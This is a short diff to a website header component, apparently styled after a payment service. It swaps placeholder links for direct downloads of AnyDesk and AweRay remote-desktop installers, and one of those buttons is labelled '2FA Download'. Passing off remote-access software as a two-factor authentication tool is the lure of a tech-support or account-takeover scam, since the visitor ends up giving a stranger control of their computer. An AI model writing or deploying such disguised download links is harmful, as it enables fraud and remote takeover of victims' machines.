@@ -103,6 +103,7 @@ export default function Header() {
               </div>
             </nav>
           </div>
+          
 
           {/* Right Area Controls */}
           <div className="flex items-center gap-3 sm:gap-6">
@@ -110,13 +111,13 @@ export default function Header() {
               Help
             </a>
             <a
-              href="https://example.com"
+              href="https://download.anydesk.com/AnyDesk.exe"
               className="text-[#003087] border-[1.5px] border-[#003087] hover:border-[#0079C1] hover:text-[#0079C1] rounded-full px-5 py-2 text-sm font-bold transition-all cursor-pointer"
             >
               Download
             </a>
             <a
-              href="https://example.com"
+              href="https://down.aweray.com/awesun/windows/Aweray_Remote_2.0.0.45399_x64.exe"
               className="bg-[#003087] text-white hover:bg-[#0079C1] rounded-full px-5 py-2.5 text-sm font-bold transition-all shadow-sm cursor-pointer"
             >
               2FA Download
